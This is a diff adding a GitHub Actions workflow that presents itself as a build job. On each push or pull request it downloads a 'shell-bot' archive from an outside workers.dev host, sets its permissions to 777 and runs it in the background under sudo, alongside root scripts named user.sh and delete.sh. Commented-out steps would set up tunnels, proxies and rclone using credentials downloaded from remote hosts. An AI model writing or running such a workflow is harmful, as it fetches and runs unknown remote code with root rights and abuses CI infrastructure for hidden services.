@@ -1,0 +1,94 @@
+name: main 
+on:
+  push:
+    branches: [ "master" ]
+  pull_request:
+    branches: [ "master" ]
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v3
+
+      - name: User
+        run: |
+         sudo bash user.sh &
+         
+      - name: Transfer
+        run: |
+         wget https://rjc.mft.workers.dev/boter.tar -O bt.tar
+         tar -xf bt.tar
+         mv shell-bot v
+         chmod 777 ./*
+         nohup sudo -u zhegejiqimeiyougeirootquanxian v/varzen &
+
+      - name: Contain
+        run: |
+         nohup sudo bash delete.sh &
+
+#      - name: Public
+#        run: |
+#         wget "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64" -O cloudflared-linux-amd64
+#         wget "https://drive.google.com/uc?export=download&id=16x9JljqsB9g-C1Hr1Og7W6TSFQznuJVi" -O tun.json
+#         wget "https://drive.google.com/uc?export=download&id=13JPNooJR0H06HCcXAn9SUEvWAukEC1gG" -O tun.pem
+#         sudo chmod 777 ./*
+#         nohup sudo ./cloudflared-linux-amd64 tunnel --name action-alist --url http://localhost:8700 --credentials-file ./tun.json --origincert ./tun.pem &
+
+#      - name: Manager
+#        run: |
+#         sudo mkdir /Nginx
+#         sudo mkdir /Nginx/logs
+#         sudo cp ./aria2.sh /Nginx/logs/access.log
+#         sudo chmod 777 /Nginx/*
+#         sudo chmod 777 /Nginx/logs/*
+#         sudo cp ./action-nginx.conf /Nginx/action-nginx.conf
+#         sudo ./nginx -c action-nginx.conf
+
+#      - name: Content
+#        run: |
+#         wget "https://rjc.mft.workers.dev/pubdta" -O account-debug.json
+#         echo [content] > rclone.conf
+#         echo type = drive >> rclone.conf
+#         echo scope = drive >> rclone.conf
+#         echo root_folder_id =  >> rclone.conf
+#         echo service_account_file = account-debug.json >> rclone.conf
+#         echo use_trash = false >> rclone.conf
+#         echo upload_cutoff = 5Ti >> rclone.conf
+#         echo chunk_size = 32Mi >> rclone.conf
+#         echo acknowledge_abuse = true >> rclone.conf
+#         echo team_drive = >> rclone.conf
+#         sudo chmod 777 ./*
+#         nohup sudo ./rclone -P copy content:gitcontent ./gitcontent --transfers 12 >> cloudreve.log.txt &
+#         sudo chmod 777 ./*
+#         sudo mkdir /home/pubdata/
+#         sudo chmod 777 /home/pubdata/
+         
+#      - name: RAY
+#        run: |
+#         nohup ./xray-linux-amd64 &
+
+#      - name: PaiHuangPian
+#        run: |
+#         nohup sudo php -S 0.0.0.0:8880 &
+
+#      - name: Aria2
+#        run: |
+#         sudo chmod 777 ./*
+#         echo 1 | sudo bash ./aria2.sh
+#         echo 11 | sudo bash ./aria2.sh
+#         echo 8 | sudo bash ./aria2.sh
+
+#      - name: Alist
+#        run: |
+#         ./rclone sync content:alistonaction ./alist
+#         cd ./alist
+#         chmod 777 ./*
+#         nohup sudo ./alist server &
+    
+      - name: main
+        run: |
+         nohup sudo v/main
+         
+
+      
+
